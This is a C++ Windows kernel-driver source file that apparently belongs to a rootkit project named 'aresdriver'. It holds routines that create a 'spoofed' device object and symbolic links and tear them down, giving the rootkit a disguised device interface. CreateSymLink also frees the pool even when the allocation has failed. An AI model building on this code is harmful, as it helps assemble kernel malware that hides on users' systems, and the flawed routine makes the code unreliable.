#include "driver.hpp"
#include "rootkit.hpp"

extern "C" NTSTATUS CreateSpoofedDevice(_In_ struct _DRIVER_OBJECT* driver, _Out_ PDEVICE_OBJECT * device)
{
    if (driver->DeviceObject != nullptr)
        return STATUS_DEVICE_ALREADY_ATTACHED;

    *device = nullptr;

    UNICODE_STRING device_name{}, dos_device_name{};

    RtlInitUnicodeString(&device_name, aresdriver::device_name);
    RtlInitUnicodeString(&dos_device_name, aresdriver::dos_device_name);

    auto status = IoCreateDevice(driver, 0, &device_name, FILE_DEVICE_KS, FILE_DEVICE_SECURE_OPEN, FALSE, device);

    if (NT_ERROR(status)) {
#if DEBUG
        DbgPrint("Failed to create a spoofed device. Skipping.\n");
#endif
        * device = nullptr;
        return status;
    }

    status = IoCreateSymbolicLink(&dos_device_name, &device_name);

    if (NT_ERROR(status))
    {
#if DEBUG
        DbgPrint("Failed to create symlink for spoofed device. Skipping.\n");
#endif
        IoDeleteDevice(*device);
        *device = nullptr;
        return status;
    }

    (*device)->Flags &= ~DO_DEVICE_INITIALIZING;
    (*device)->Flags |= DO_BUFFERED_IO;

    return STATUS_SUCCESS;
}

extern "C" VOID DestroyDevice(PDEVICE_OBJECT * device)
{
    if (*device == nullptr)
        return;

    IoDeleteDevice(*device);
    *device = nullptr;
}

extern "C" NTSTATUS DeleteSymLink()
{
    UNICODE_STRING dos_device_name{};
    RtlInitUnicodeString(&dos_device_name, aresdriver::dos_device_name);
    return IoDeleteSymbolicLink(&dos_device_name);
}

extern "C" NTSTATUS CreateSymLink(const PDEVICE_OBJECT device)
{
    ULONG size = 0;
    PUNICODE_STRING device_name = nullptr;
    auto status = STATUS_SUCCESS;
#if DEBUG
    DbgPrint("[+] Creating SymLink!\n");
#endif
    status = ObQueryNameString(device, nullptr, 0, &size);

    if (status == STATUS_INFO_LENGTH_MISMATCH) {

        device_name = PUNICODE_STRING(ExAllocatePoolWithTag(NonPagedPool, size, 'dead'));

        if (device_name != nullptr) {

            RtlSecureZeroMemory(device_name, size);
            status = ObQueryNameString(device, POBJECT_NAME_INFORMATION(device_name), size, &size);
            if (NT_SUCCESS(status) && device_name->Buffer != nullptr)
            {
#if DEBUG
                DbgPrint("[+] Device name: %wZ\n", device_name);
#endif

                UNICODE_STRING dos_device_name{};
                RtlInitUnicodeString(&dos_device_name, aresdriver::dos_device_name);

                status = IoCreateSymbolicLink(&dos_device_name, device_name);
#if DEBUG
                DbgPrint("[!] SymLink %wZ -> %wZ\n", device_name, &dos_device_name);
#endif
            }
            else
                status = STATUS_INTERNAL_ERROR;
        }
        ExFreePoolWithTag(device_name, 'dead');
    }

    return status;
}